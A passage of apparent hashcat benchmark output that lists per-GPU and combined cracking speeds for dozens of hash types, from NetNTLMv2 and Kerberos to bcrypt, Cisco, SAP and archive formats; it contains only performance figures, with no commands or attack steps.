MH/s (63.29ms)\nSpeed.Dev.#4.....: 16372.3 MH/s (61.45ms)\nSpeed.Dev.#*.....: 64071.3 MH/s\n\nHashtype: NetNTLMv2\n\nSpeed.Dev.#1.....:  1226.7 MH/s (51.25ms)\nSpeed.Dev.#2.....:  1198.0 MH/s (52.49ms)\nSpeed.Dev.#3.....:  1195.6 MH/s (52.58ms)\nSpeed.Dev.#4.....:  1227.9 MH/s (51.20ms)\nSpeed.Dev.#*.....:  4848.2 MH/s\n\nHashtype: IPMI2 RAKP HMAC-SHA1\n\nSpeed.Dev.#1.....:  1214.1 MH/s (50.91ms)\nSpeed.Dev.#2.....:  1215.1 MH/s (51.75ms)\nSpeed.Dev.#3.....:  1209.8 MH/s (51.98ms)\nSpeed.Dev.#4.....:  1244.9 MH/s (50.50ms)\nSpeed.Dev.#*.....:  4883.9 MH/s\n\nHashtype: Kerberos 5 AS-REQ Pre-Auth etype 23\n\nSpeed.Dev.#1.....:   219.2 MH/s (71.72ms)\nSpeed.Dev.#2.....:   214.5 MH/s (73.32ms)\nSpeed.Dev.#3.....:   214.1 MH/s (73.46ms)\nSpeed.Dev.#4.....:   218.8 MH/s (71.84ms)\nSpeed.Dev.#*.....:   866.6 MH/s\n\nHashtype: Kerberos 5 TGS-REP etype 23\n\nSpeed.Dev.#1.....:   218.9 MH/s (71.81ms)\nSpeed.Dev.#2.....:   214.1 MH/s (73.44ms)\nSpeed.Dev.#3.....:   213.3 MH/s (73.72ms)\nSpeed.Dev.#4.....:   218.6 MH/s (71.91ms)\nSpeed.Dev.#*.....:   864.9 MH/s\n\nHashtype: DNSSEC (NSEC3)\n\nSpeed.Dev.#1.....:  2521.0 MH/s (49.68ms)\nSpeed.Dev.#2.....:  2455.0 MH/s (51.03ms)\nSpeed.Dev.#3.....:  2445.0 MH/s (51.24ms)\nSpeed.Dev.#4.....:  2525.2 MH/s (49.60ms)\nSpeed.Dev.#*.....:  9946.2 MH/s\n\nHashtype: PostgreSQL CRAM (MD5)\n\nSpeed.Dev.#1.....:  4959.3 MH/s (50.72ms)\nSpeed.Dev.#2.....:  4852.7 MH/s (51.84ms)\nSpeed.Dev.#3.....:  4849.3 MH/s (51.87ms)\nSpeed.Dev.#4.....:  5003.9 MH/s (50.25ms)\nSpeed.Dev.#*.....: 19665.2 MH/s\n\nHashtype: MySQL CRAM (SHA1)\n\nSpeed.Dev.#1.....:  1709.6 MH/s (73.29ms)\nSpeed.Dev.#2.....:  1678.1 MH/s (74.66ms)\nSpeed.Dev.#3.....:  1670.3 MH/s (75.02ms)\nSpeed.Dev.#4.....:  1711.7 MH/s (73.19ms)\nSpeed.Dev.#*.....:  6769.8 MH/s\n\nHashtype: SIP digest authentication (MD5)\n\nSpeed.Dev.#1.....:  1505.2 MH/s (83.25ms)\nSpeed.Dev.#2.....:  1469.5 MH/s (85.27ms)\nSpeed.Dev.#3.....:  1465.1 MH/s (85.53ms)\nSpeed.Dev.#4.....:  1498.1 MH/s (83.63ms)\nSpeed.Dev.#*.....:  5937.9 MH/s\n\nHashtype: SMF (Simple Machines Forum) > v1.1\n\nSpeed.Dev.#1.....:  5150.0 MH/s (48.84ms)\nSpeed.Dev.#2.....:  4996.3 MH/s (50.34ms)\nSpeed.Dev.#3.....:  5017.7 MH/s (50.13ms)\nSpeed.Dev.#4.....:  5163.9 MH/s (48.69ms)\nSpeed.Dev.#*.....: 20327.9 MH/s\n\nHashtype: vBulletin < v3.8.5\n\nSpeed.Dev.#1.....:  5124.4 MH/s (98.19ms)\nSpeed.Dev.#2.....:  5078.3 MH/s (49.54ms)\nSpeed.Dev.#3.....:  5067.3 MH/s (49.64ms)\nSpeed.Dev.#4.....:  5170.2 MH/s (97.31ms)\nSpeed.Dev.#*.....: 20440.2 MH/s\n\nHashtype: vBulletin >= v3.8.5\n\nSpeed.Dev.#1.....:  3587.0 MH/s (70.13ms)\nSpeed.Dev.#2.....:  3472.0 MH/s (72.46ms)\nSpeed.Dev.#3.....:  3511.7 MH/s (71.63ms)\nSpeed.Dev.#4.....:  3592.0 MH/s (70.02ms)\nSpeed.Dev.#*.....: 14162.8 MH/s\n\nHashtype: IPB2+ (Invision Power Board), MyBB 1.2+\n\nSpeed.Dev.#1.....:  3724.1 MH/s (67.55ms)\nSpeed.Dev.#2.....:  3644.8 MH/s (69.02ms)\nSpeed.Dev.#3.....:  3629.7 MH/s (69.31ms)\nSpeed.Dev.#4.....:  3735.4 MH/s (67.33ms)\nSpeed.Dev.#*.....: 14734.0 MH/s\n\nHashtype: WBB3 (Woltlab Burning Board)\n\nSpeed.Dev.#1.....:   949.9 MH/s (66.21ms)\nSpeed.Dev.#2.....:   917.7 MH/s (68.53ms)\nSpeed.Dev.#3.....:   928.0 MH/s (67.77ms)\nSpeed.Dev.#4.....:   952.7 MH/s (66.00ms)\nSpeed.Dev.#*.....:  3748.4 MH/s\n\nHashtype: OpenCart\n\nSpeed.Dev.#1.....:  1517.5 MH/s (82.57ms)\nSpeed.Dev.#2.....:  1464.4 MH/s (85.55ms)\nSpeed.Dev.#3.....:  1476.6 MH/s (84.85ms)\nSpeed.Dev.#4.....:  1530.1 MH/s (81.87ms)\nSpeed.Dev.#*.....:  5988.6 MH/s\n\nHashtype: Joomla < 2.5.18\n\nSpeed.Dev.#1.....: 18142.8 MH/s (55.46ms)\nSpeed.Dev.#2.....: 17645.1 MH/s (57.03ms)\nSpeed.Dev.#3.....: 17620.0 MH/s (57.11ms)\nSpeed.Dev.#4.....: 18255.3 MH/s (55.11ms)\nSpeed.Dev.#*.....: 71663.1 MH/s\n\nHashtype: PHPS\n\nSpeed.Dev.#1.....:  5138.9 MH/s (97.91ms)\nSpeed.Dev.#2.....:  5039.4 MH/s (49.91ms)\nSpeed.Dev.#3.....:  4997.9 MH/s (49.98ms)\nSpeed.Dev.#4.....:  5168.6 MH/s (97.35ms)\nSpeed.Dev.#*.....: 20344.9 MH/s\n\nHashtype: Drupal7\n\nSpeed.Dev.#1.....:    41724 H/s (91.83ms)\nSpeed.Dev.#2.....:    40690 H/s (94.11ms)\nSpeed.Dev.#3.....:    40936 H/s (93.59ms)\nSpeed.Dev.#4.....:    41903 H/s (91.30ms)\nSpeed.Dev.#*.....:   165.3 kH/s\n\nHashtype: osCommerce, xt:Commerce\n\nSpeed.Dev.#1.....:  9619.0 MH/s (52.30ms)\nSpeed.Dev.#2.....:  9418.3 MH/s (53.42ms)\nSpeed.Dev.#3.....:  9326.9 MH/s (53.94ms)\nSpeed.Dev.#4.....:  9596.5 MH/s (52.42ms)\nSpeed.Dev.#*.....: 37960.8 MH/s\n\nHashtype: PrestaShop\n\nSpeed.Dev.#1.....:  6069.6 MH/s (82.90ms)\nSpeed.Dev.#2.....:  5902.6 MH/s (85.25ms)\nSpeed.Dev.#3.....:  5877.5 MH/s (85.61ms)\nSpeed.Dev.#4.....:  6094.5 MH/s (82.55ms)\nSpeed.Dev.#*.....: 23944.2 MH/s\n\nHashtype: Django (SHA-1)\n\nSpeed.Dev.#1.....:  5135.8 MH/s (48.97ms)\nSpeed.Dev.#2.....:  4962.2 MH/s (50.69ms)\nSpeed.Dev.#3.....:  4966.8 MH/s (50.64ms)\nSpeed.Dev.#4.....:  5138.0 MH/s (48.94ms)\nSpeed.Dev.#*.....: 20202.8 MH/s\n\nHashtype: Django (PBKDF2-SHA256)\n\nSpeed.Dev.#1.....:    44292 H/s (70.74ms)\nSpeed.Dev.#2.....:    43508 H/s (72.15ms)\nSpeed.Dev.#3.....:    43785 H/s (71.70ms)\nSpeed.Dev.#4.....:    44754 H/s (70.13ms)\nSpeed.Dev.#*.....:   176.3 kH/s\n\nHashtype: MediaWiki B type\n\nSpeed.Dev.#1.....:  4846.4 MH/s (51.90ms)\nSpeed.Dev.#2.....:  4772.2 MH/s (52.71ms)\nSpeed.Dev.#3.....:  4734.4 MH/s (53.13ms)\nSpeed.Dev.#4.....:  4876.2 MH/s (51.57ms)\nSpeed.Dev.#*.....: 19229.2 MH/s\n\nHashtype: Redmine\n\nSpeed.Dev.#1.....:  2047.7 MH/s (61.18ms)\nSpeed.Dev.#2.....:  2005.9 MH/s (62.46ms)\nSpeed.Dev.#3.....:  2000.3 MH/s (62.63ms)\nSpeed.Dev.#4.....:  2049.1 MH/s (61.13ms)\nSpeed.Dev.#*.....:  8103.0 MH/s\n\nHashtype: PunBB\n\nSpeed.Dev.#1.....:  2046.3 MH/s (61.21ms)\nSpeed.Dev.#2.....:  2001.3 MH/s (62.60ms)\nSpeed.Dev.#3.....:  2002.7 MH/s (62.56ms)\nSpeed.Dev.#4.....:  2054.3 MH/s (60.97ms)\nSpeed.Dev.#*.....:  8104.7 MH/s\n\nHashtype: PostgreSQL\n\nSpeed.Dev.#1.....: 18040.3 MH/s (55.77ms)\nSpeed.Dev.#2.....: 17615.1 MH/s (57.12ms)\nSpeed.Dev.#3.....: 17652.2 MH/s (57.01ms)\nSpeed.Dev.#4.....: 18090.6 MH/s (55.61ms)\nSpeed.Dev.#*.....: 71398.2 MH/s\n\nHashtype: MSSQL (2000)\n\nSpeed.Dev.#1.....:  6132.5 MH/s (82.04ms)\nSpeed.Dev.#2.....:  5995.0 MH/s (83.93ms)\nSpeed.Dev.#3.....:  6007.4 MH/s (83.76ms)\nSpeed.Dev.#4.....:  6153.9 MH/s (81.75ms)\nSpeed.Dev.#*.....: 24288.8 MH/s\n\nHashtype: MSSQL (2005)\n\nSpeed.Dev.#1.....:  6140.8 MH/s (81.94ms)\nSpeed.Dev.#2.....:  5950.7 MH/s (83.90ms)\nSpeed.Dev.#3.....:  5999.9 MH/s (83.87ms)\nSpeed.Dev.#4.....:  6142.0 MH/s (81.90ms)\nSpeed.Dev.#*.....: 24233.3 MH/s\n\nHashtype: MSSQL (2012, 2014)\n\nSpeed.Dev.#1.....:   758.9 MH/s (82.88ms)\nSpeed.Dev.#2.....:   744.1 MH/s (84.52ms)\nSpeed.Dev.#3.....:   745.3 MH/s (84.38ms)\nSpeed.Dev.#4.....:   758.7 MH/s (82.89ms)\nSpeed.Dev.#*.....:  3007.1 MH/s\n\nHashtype: MySQL323\n\nSpeed.Dev.#1.....: 37231.7 MH/s (52.46ms)\nSpeed.Dev.#2.....: 37910.3 MH/s (53.08ms)\nSpeed.Dev.#3.....: 37809.2 MH/s (53.23ms)\nSpeed.Dev.#4.....: 38912.7 MH/s (51.71ms)\nSpeed.Dev.#*.....:   151.9 GH/s\n\nHashtype: MySQL4.1/MySQL5\n\nSpeed.Dev.#1.....:  2756.4 MH/s (91.28ms)\nSpeed.Dev.#2.....:  2674.2 MH/s (94.08ms)\nSpeed.Dev.#3.....:  2678.4 MH/s (93.93ms)\nSpeed.Dev.#4.....:  2775.5 MH/s (90.63ms)\nSpeed.Dev.#*.....: 10884.6 MH/s\n\nHashtype: Oracle H: Type (Oracle 7+)\n\nSpeed.Dev.#1.....:   719.7 MH/s (87.39ms)\nSpeed.Dev.#2.....:   702.4 MH/s (89.54ms)\nSpeed.Dev.#3.....:   699.1 MH/s (89.96ms)\nSpeed.Dev.#4.....:   730.7 MH/s (86.08ms)\nSpeed.Dev.#*.....:  2852.0 MH/s\n\nHashtype: Oracle S: Type (Oracle 11+)\n\nSpeed.Dev.#1.....:  5984.1 MH/s (84.08ms)\nSpeed.Dev.#2.....:  5823.9 MH/s (86.40ms)\nSpeed.Dev.#3.....:  5831.3 MH/s (86.29ms)\nSpeed.Dev.#4.....:  6009.8 MH/s (83.71ms)\nSpeed.Dev.#*.....: 23649.1 MH/s\n\nHashtype: Oracle T: Type (Oracle 12+)\n\nSpeed.Dev.#1.....:    78612 H/s (97.48ms)\nSpeed.Dev.#2.....:    76241 H/s (50.30ms)\nSpeed.Dev.#3.....:    76643 H/s (50.03ms)\nSpeed.Dev.#4.....:    79545 H/s (96.35ms)\nSpeed.Dev.#*.....:   311.0 kH/s\n\nHashtype: Sybase ASE\n\nSpeed.Dev.#1.....:   212.6 MH/s (73.97ms)\nSpeed.Dev.#2.....:   208.5 MH/s (75.40ms)\nSpeed.Dev.#3.....:   207.8 MH/s (75.67ms)\nSpeed.Dev.#4.....:   215.3 MH/s (73.02ms)\nSpeed.Dev.#*.....:   844.2 MH/s\n\nHashtype: Episerver 6.x < .NET 4\n\nSpeed.Dev.#1.....:  5088.4 MH/s (49.42ms)\nSpeed.Dev.#2.....:  4979.7 MH/s (50.52ms)\nSpeed.Dev.#3.....:  4983.6 MH/s (50.47ms)\nSpeed.Dev.#4.....:  5165.4 MH/s (48.68ms)\nSpeed.Dev.#*.....: 20217.1 MH/s\n\nHashtype: Episerver 6.x >= .NET 4\n\nSpeed.Dev.#1.....:  2075.5 MH/s (60.36ms)\nSpeed.Dev.#2.....:  2032.3 MH/s (61.35ms)\nSpeed.Dev.#3.....:  2033.2 MH/s (61.62ms)\nSpeed.Dev.#4.....:  2090.9 MH/s (59.91ms)\nSpeed.Dev.#*.....:  8232.0 MH/s\n\nHashtype: Apache $apr1$ MD5, md5apr1, MD5 (APR)\n\nSpeed.Dev.#1.....:  7508.2 kH/s (64.25ms)\nSpeed.Dev.#2.....:  7402.5 kH/s (65.38ms)\nSpeed.Dev.#3.....:  7415.1 kH/s (65.03ms)\nSpeed.Dev.#4.....:  7623.3 kH/s (63.44ms)\nSpeed.Dev.#*.....: 29949.2 kH/s\n\nHashtype: ColdFusion 10+\n\nSpeed.Dev.#1.....:  1312.4 MH/s (95.85ms)\nSpeed.Dev.#2.....:  1299.9 MH/s (48.38ms)\nSpeed.Dev.#3.....:  1292.3 MH/s (48.66ms)\nSpeed.Dev.#4.....:  1318.3 MH/s (95.42ms)\nSpeed.Dev.#*.....:  5222.9 MH/s\n\nHashtype: hMailServer\n\nSpeed.Dev.#1.....:  2080.5 MH/s (60.22ms)\nSpeed.Dev.#2.....:  2030.1 MH/s (61.72ms)\nSpeed.Dev.#3.....:  2034.9 MH/s (61.58ms)\nSpeed.Dev.#4.....:  2034.4 MH/s (59.87ms)\nSpeed.Dev.#*.....:  8179.8 MH/s\n\nHashtype: nsldap, SHA-1(Base64), Netscape LDAP SHA\n\nSpeed.Dev.#1.....:  5990.8 MH/s (83.99ms)\nSpeed.Dev.#2.....:  5855.0 MH/s (85.94ms)\nSpeed.Dev.#3.....:  5846.6 MH/s (86.05ms)\nSpeed.Dev.#4.....:  6029.5 MH/s (83.44ms)\nSpeed.Dev.#*.....: 23721.9 MH/s\n\nHashtype: nsldaps, SSHA-1(Base64), Netscape LDAP SSHA\n\nSpeed.Dev.#1.....:  5953.2 MH/s (84.52ms)\nSpeed.Dev.#2.....:  5857.8 MH/s (85.90ms)\nSpeed.Dev.#3.....:  5854.9 MH/s (85.93ms)\nSpeed.Dev.#4.....:  6013.3 MH/s (83.67ms)\nSpeed.Dev.#*.....: 23679.3 MH/s\n\nHashtype: SSHA-256(Base64), LDAP {SSHA256}\n\nSpeed.Dev.#1.....:  2331.0 MH/s (53.74ms)\nSpeed.Dev.#2.....:  2289.4 MH/s (54.73ms)\nSpeed.Dev.#3.....:  2285.1 MH/s (54.82ms)\nSpeed.Dev.#4.....:  2346.9 MH/s (53.37ms)\nSpeed.Dev.#*.....:  9252.4 MH/s\n\nHashtype: SSHA-512(Base64), LDAP {SSHA512}\n\nSpeed.Dev.#1.....:   796.0 MH/s (79.00ms)\nSpeed.Dev.#2.....:   778.3 MH/s (80.80ms)\nSpeed.Dev.#3.....:   775.5 MH/s (81.10ms)\nSpeed.Dev.#4.....:   800.4 MH/s (78.57ms)\nSpeed.Dev.#*.....:  3150.3 MH/s\n\nHashtype: LM\n\nSpeed.Dev.#1.....: 13666.9 MH/s (73.08ms)\nSpeed.Dev.#2.....: 12557.0 MH/s (80.10ms)\nSpeed.Dev.#3.....: 12984.0 MH/s (77.47ms)\nSpeed.Dev.#4.....: 12693.5 MH/s (79.22ms)\nSpeed.Dev.#*.....: 51901.3 MH/s\n\nHashtype: NTLM\n\nSpeed.Dev.#1.....: 29890.8 MH/s (67.33ms)\nSpeed.Dev.#2.....: 29527.8 MH/s (68.16ms)\nSpeed.Dev.#3.....: 29228.6 MH/s (68.85ms)\nSpeed.Dev.#4.....: 30347.2 MH/s (66.31ms)\nSpeed.Dev.#*.....:   119.0 GH/s\n\nHashtype: Domain Cached Credentials (DCC), MS Cache\n\nSpeed.Dev.#1.....:  8545.0 MH/s (58.87ms)\nSpeed.Dev.#2.....:  8295.0 MH/s (60.64ms)\nSpeed.Dev.#3.....:  8249.5 MH/s (60.43ms)\nSpeed.Dev.#4.....:  8640.5 MH/s (58.22ms)\nSpeed.Dev.#*.....: 33729.9 MH/s\n\nHashtype: Domain Cached Credentials 2 (DCC2), MS Cache 2\n\nSpeed.Dev.#1.....:   240.7 kH/s (101.38ms)\nSpeed.Dev.#2.....:   233.6 kH/s (51.38ms)\nSpeed.Dev.#3.....:   234.8 kH/s (51.23ms)\nSpeed.Dev.#4.....:   242.4 kH/s (100.85ms)\nSpeed.Dev.#*.....:   951.6 kH/s\n\nHashtype: MS-AzureSync PBKDF2-HMAC-SHA256\n\nSpeed.Dev.#1.....:  8025.9 kH/s (50.16ms)\nSpeed.Dev.#2.....:  7830.9 kH/s (51.30ms)\nSpeed.Dev.#3.....:  7814.5 kH/s (51.06ms)\nSpeed.Dev.#4.....:  8075.4 kH/s (49.75ms)\nSpeed.Dev.#*.....: 31746.8 kH/s\n\nHashtype: descrypt, DES (Unix), Traditional DES\n\nSpeed.Dev.#1.....:   673.4 MH/s (93.38ms)\nSpeed.Dev.#2.....:   658.1 MH/s (95.54ms)\nSpeed.Dev.#3.....:   657.6 MH/s (95.60ms)\nSpeed.Dev.#4.....:   677.1 MH/s (92.83ms)\nSpeed.Dev.#*.....:  2666.2 MH/s\n\nHashtype: BSDiCrypt, Extended DES\n\nSpeed.Dev.#1.....:  1157.7 kH/s (70.25ms)\nSpeed.Dev.#2.....:  1137.6 kH/s (71.57ms)\nSpeed.Dev.#3.....:  1122.5 kH/s (72.54ms)\nSpeed.Dev.#4.....:  1160.4 kH/s (70.15ms)\nSpeed.Dev.#*.....:  4578.2 kH/s\n\nHashtype: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)\n\nSpeed.Dev.#1.....:  7567.1 kH/s (63.93ms)\nSpeed.Dev.#2.....:  7398.6 kH/s (65.41ms)\nSpeed.Dev.#3.....:  7389.4 kH/s (65.49ms)\nSpeed.Dev.#4.....:  7603.2 kH/s (63.62ms)\nSpeed.Dev.#*.....: 29958.3 kH/s\n\nHashtype: bcrypt $2*$, Blowfish (Unix)\n\nSpeed.Dev.#1.....:    10818 H/s (40.37ms)\nSpeed.Dev.#2.....:    10668 H/s (40.94ms)\nSpeed.Dev.#3.....:    10542 H/s (41.43ms)\nSpeed.Dev.#4.....:    10847 H/s (40.24ms)\nSpeed.Dev.#*.....:    42875 H/s\n\nHashtype: sha256crypt $5$, SHA256 (Unix)\n\nSpeed.Dev.#1.....:   278.8 kH/s (87.39ms)\nSpeed.Dev.#2.....:   272.4 kH/s (89.43ms)\nSpeed.Dev.#3.....:   275.2 kH/s (88.52ms)\nSpeed.Dev.#4.....:   282.3 kH/s (86.28ms)\nSpeed.Dev.#*.....:  1108.6 kH/s\n\nHashtype: sha512crypt $6$, SHA512 (Unix)\n\nSpeed.Dev.#1.....:   113.1 kH/s (54.82ms)\nSpeed.Dev.#2.....:   110.3 kH/s (56.24ms)\nSpeed.Dev.#3.....:   109.9 kH/s (56.08ms)\nSpeed.Dev.#4.....:   113.3 kH/s (54.72ms)\nSpeed.Dev.#*.....:   446.6 kH/s\n\nHashtype: OSX v10.4, OSX v10.5, OSX v10.6\n\nSpeed.Dev.#1.....:  5088.6 MH/s (49.43ms)\nSpeed.Dev.#2.....:  4929.3 MH/s (51.03ms)\nSpeed.Dev.#3.....:  4967.6 MH/s (50.64ms)\nSpeed.Dev.#4.....:  5088.0 MH/s (49.23ms)\nSpeed.Dev.#*.....: 20073.5 MH/s\n\nHashtype: OSX v10.7\n\nSpeed.Dev.#1.....:   695.1 MH/s (90.48ms)\nSpeed.Dev.#2.....:   679.9 MH/s (92.51ms)\nSpeed.Dev.#3.....:   684.6 MH/s (91.87ms)\nSpeed.Dev.#4.....:   701.1 MH/s (89.70ms)\nSpeed.Dev.#*.....:  2760.7 MH/s\n\nHashtype: OSX v10.8+ (PBKDF2-SHA512)\n\nSpeed.Dev.#1.....:     9141 H/s (97.90ms)\nSpeed.Dev.#2.....:     8838 H/s (50.45ms)\nSpeed.Dev.#3.....:     8899 H/s (50.28ms)\nSpeed.Dev.#4.....:     9277 H/s (96.45ms)\nSpeed.Dev.#*.....:    36156 H/s\n\nHashtype: AIX {smd5}\n\nSpeed.Dev.#1.....:  7536.0 kH/s (64.20ms)\nSpeed.Dev.#2.....:  7336.1 kH/s (65.97ms)\nSpeed.Dev.#3.....:  7353.2 kH/s (65.81ms)\nSpeed.Dev.#4.....:  7570.3 kH/s (63.89ms)\nSpeed.Dev.#*.....: 29795.6 kH/s\n\nHashtype: AIX {ssha1}\n\nSpeed.Dev.#1.....: 33142.8 kH/s (52.17ms)\nSpeed.Dev.#2.....: 32529.7 kH/s (53.26ms)\nSpeed.Dev.#3.....: 32622.0 kH/s (53.10ms)\nSpeed.Dev.#4.....: 33458.6 kH/s (51.88ms)\nSpeed.Dev.#*.....:   131.8 MH/s\n\nHashtype: AIX {ssha256}\n\nSpeed.Dev.#1.....: 12635.4 kH/s (72.85ms)\nSpeed.Dev.#2.....: 12303.6 kH/s (74.86ms)\nSpeed.Dev.#3.....: 12453.0 kH/s (73.86ms)\nSpeed.Dev.#4.....: 12707.4 kH/s (72.42ms)\nSpeed.Dev.#*.....: 50099.4 kH/s\n\nHashtype: AIX {ssha512}\n\nSpeed.Dev.#1.....:  4662.2 kH/s (95.47ms)\nSpeed.Dev.#2.....:  4667.9 kH/s (49.55ms)\nSpeed.Dev.#3.....:  4659.5 kH/s (49.66ms)\nSpeed.Dev.#4.....:  4893.7 kH/s (94.58ms)\nSpeed.Dev.#*.....: 18883.3 kH/s\n\nHashtype: Cisco-PIX MD5\n\nSpeed.Dev.#1.....: 11925.8 MH/s (84.38ms)\nSpeed.Dev.#2.....: 11662.9 MH/s (86.29ms)\nSpeed.Dev.#3.....: 11691.4 MH/s (86.07ms)\nSpeed.Dev.#4.....: 12013.6 MH/s (83.76ms)\nSpeed.Dev.#*.....: 47293.7 MH/s\n\nHashtype: Cisco-ASA MD5\n\nSpeed.Dev.#1.....: 13101.1 MH/s (76.80ms)\nSpeed.Dev.#2.....: 12825.5 MH/s (78.46ms)\nSpeed.Dev.#3.....: 12820.1 MH/s (78.50ms)\nSpeed.Dev.#4.....: 13241.3 MH/s (75.99ms)\nSpeed.Dev.#*.....: 51988.0 MH/s\n\nHashtype: Cisco-IOS type 4 (SHA256)\n\nSpeed.Dev.#1.....:  2322.6 MH/s (53.94ms)\nSpeed.Dev.#2.....:  2265.4 MH/s (55.30ms)\nSpeed.Dev.#3.....:  2270.2 MH/s (55.18ms)\nSpeed.Dev.#4.....:  2335.9 MH/s (53.63ms)\nSpeed.Dev.#*.....:  9194.1 MH/s\n\nHashtype: Cisco-IOS $8$ (PBKDF2-SHA256)\n\nSpeed.Dev.#1.....:    44192 H/s (71.03ms)\nSpeed.Dev.#2.....:    43284 H/s (72.53ms)\nSpeed.Dev.#3.....:    43386 H/s (72.25ms)\nSpeed.Dev.#4.....:    44620 H/s (70.33ms)\nSpeed.Dev.#*.....:   175.5 kH/s\n\nHashtype: Cisco-IOS $9$ (scrypt)\n\nSpeed.Dev.#1.....:    12529 H/s (612.73ms)\nSpeed.Dev.#2.....:    12406 H/s (618.30ms)\nSpeed.Dev.#3.....:    12345 H/s (621.89ms)\nSpeed.Dev.#4.....:    12765 H/s (600.95ms)\nSpeed.Dev.#*.....:    50045 H/s\n\nHashtype: Juniper NetScreen/SSG (ScreenOS)\n\nSpeed.Dev.#1.....:  9386.0 MH/s (53.60ms)\nSpeed.Dev.#2.....:  9159.2 MH/s (54.93ms)\nSpeed.Dev.#3.....:  9139.2 MH/s (55.05ms)\nSpeed.Dev.#4.....:  9450.9 MH/s (53.22ms)\nSpeed.Dev.#*.....: 37135.4 MH/s\n\nHashtype: Juniper IVE\n\nSpeed.Dev.#1.....:  7544.3 kH/s (64.13ms)\nSpeed.Dev.#2.....:  7342.7 kH/s (65.91ms)\nSpeed.Dev.#3.....:  7321.3 kH/s (65.68ms)\nSpeed.Dev.#4.....:  7563.8 kH/s (63.95ms)\nSpeed.Dev.#*.....: 29772.2 kH/s\n\nHashtype: Samsung Android Password/PIN\n\nSpeed.Dev.#1.....:  3999.3 kH/s (60.91ms)\nSpeed.Dev.#2.....:  3872.1 kH/s (62.71ms)\nSpeed.Dev.#3.....:  3926.6 kH/s (62.05ms)\nSpeed.Dev.#4.....:  4021.6 kH/s (60.36ms)\nSpeed.Dev.#*.....: 15819.6 kH/s\n\nHashtype: Citrix NetScaler\n\nSpeed.Dev.#1.....:  5399.8 MH/s (93.19ms)\nSpeed.Dev.#2.....:  5268.2 MH/s (95.51ms)\nSpeed.Dev.#3.....:  5258.5 MH/s (95.69ms)\nSpeed.Dev.#4.....:  5450.2 MH/s (92.32ms)\nSpeed.Dev.#*.....: 21376.6 MH/s\n\nHashtype: RACF\n\nSpeed.Dev.#1.....:  1939.6 MH/s (64.85ms)\nSpeed.Dev.#2.....:  1873.5 MH/s (67.13ms)\nSpeed.Dev.#3.....:  1872.3 MH/s (67.18ms)\nSpeed.Dev.#4.....:  1922.1 MH/s (65.43ms)\nSpeed.Dev.#*.....:  7607.4 MH/s\n\nHashtype: GRUB 2\n\nSpeed.Dev.#1.....:    32024 H/s (98.04ms)\nSpeed.Dev.#2.....:    31288 H/s (50.18ms)\nSpeed.Dev.#3.....:    31362 H/s (50.05ms)\nSpeed.Dev.#4.....:    32474 H/s (96.64ms)\nSpeed.Dev.#*.....:   127.1 kH/s\n\nHashtype: Radmin2\n\nSpeed.Dev.#1.....:  6179.4 MH/s (81.43ms)\nSpeed.Dev.#2.....:  5995.4 MH/s (83.91ms)\nSpeed.Dev.#3.....:  6032.6 MH/s (83.37ms)\nSpeed.Dev.#4.....:  6216.5 MH/s (80.92ms)\nSpeed.Dev.#*.....: 24423.9 MH/s\n\nHashtype: SAP CODVN B (BCODE)\n\nSpeed.Dev.#1.....:  1713.3 MH/s (73.13ms)\nSpeed.Dev.#2.....:  1754.2 MH/s (71.43ms)\nSpeed.Dev.#3.....:  1778.3 MH/s (70.46ms)\nSpeed.Dev.#4.....:  1799.7 MH/s (69.61ms)\nSpeed.Dev.#*.....:  7045.5 MH/s\n\nHashtype: SAP CODVN F/G (PASSCODE)\n\nSpeed.Dev.#1.....:   762.3 MH/s (82.51ms)\nSpeed.Dev.#2.....:   742.9 MH/s (84.66ms)\nSpeed.Dev.#3.....:   742.5 MH/s (84.71ms)\nSpeed.Dev.#4.....:   772.3 MH/s (81.43ms)\nSpeed.Dev.#*.....:  3020.0 MH/s\n\nHashtype: SAP CODVN H (PWDSALTEDHASH) iSSHA-1\n\nSpeed.Dev.#1.....:  4434.7 kH/s (54.83ms)\nSpeed.Dev.#2.....:  4288.0 kH/s (56.21ms)\nSpeed.Dev.#3.....:  4352.1 kH/s (55.87ms)\nSpeed.Dev.#4.....:  4489.8 kH/s (54.13ms)\nSpeed.Dev.#*.....: 17564.6 kH/s\n\nHashtype: Lotus Notes/Domino 5\n\nSpeed.Dev.#1.....:   159.9 MH/s (98.32ms)\nSpeed.Dev.#2.....:   157.0 MH/s (100.16ms)\nSpeed.Dev.#3.....:   155.1 MH/s (101.41ms)\nSpeed.Dev.#4.....:   160.2 MH/s (98.14ms)\nSpeed.Dev.#*.....:   632.2 MH/s\n\nHashtype: Lotus Notes/Domino 6\n\nSpeed.Dev.#1.....: 53502.4 kH/s (73.46ms)\nSpeed.Dev.#2.....: 52626.7 kH/s (74.70ms)\nSpeed.Dev.#3.....: 51979.0 kH/s (75.63ms)\nSpeed.Dev.#4.....: 53643.3 kH/s (73.27ms)\nSpeed.Dev.#*.....:   211.8 MH/s\n\nHashtype: Lotus Notes/Domino 8\n\nSpeed.Dev.#1.....:   482.5 kH/s (50.35ms)\nSpeed.Dev.#2.....:   470.0 kH/s (51.84ms)\nSpeed.Dev.#3.....:   474.0 kH/s (51.39ms)\nSpeed.Dev.#4.....:   490.3 kH/s (49.67ms)\nSpeed.Dev.#*.....:  1916.8 kH/s\n\nHashtype: PeopleSoft\n\nSpeed.Dev.#1.....:  6131.4 MH/s (82.06ms)\nSpeed.Dev.#2.....:  5926.6 MH/s (84.90ms)\nSpeed.Dev.#3.....:  5971.0 MH/s (84.27ms)\nSpeed.Dev.#4.....:  6157.1 MH/s (81.71ms)\nSpeed.Dev.#*.....: 24186.1 MH/s\n\nHashtype: PeopleSoft PS_TOKEN\n\nSpeed.Dev.#1.....:  2389.7 MH/s (52.42ms)\nSpeed.Dev.#2.....:  2334.6 MH/s (53.67ms)\nSpeed.Dev.#3.....:  2325.8 MH/s (53.86ms)\nSpeed.Dev.#4.....:  2402.3 MH/s (52.13ms)\nSpeed.Dev.#*.....:  9452.4 MH/s\n\nHashtype: 7-Zip\n\nSpeed.Dev.#1.....:     7017 H/s (68.33ms)\nSpeed.Dev.#2.....:     6835 H/s (70.07ms)\nSpeed.Dev.#3.....:     6808 H/s (70.32ms)\nSpeed.Dev.#4.....:     7030 H/s (67.97ms)\nSpeed.Dev.#*.....:    27689 H/s\n\nHashtype: WinZip\n\nSpeed.Dev.#1.....:   799.3 kH/s (66.65ms)\nSpeed.Dev.#2.....:   757.4 kH/s (70.30ms)\nSpeed.Dev.#3.....:   783.2 kH/s (68.02ms)\nSpeed.Dev.#4.....:   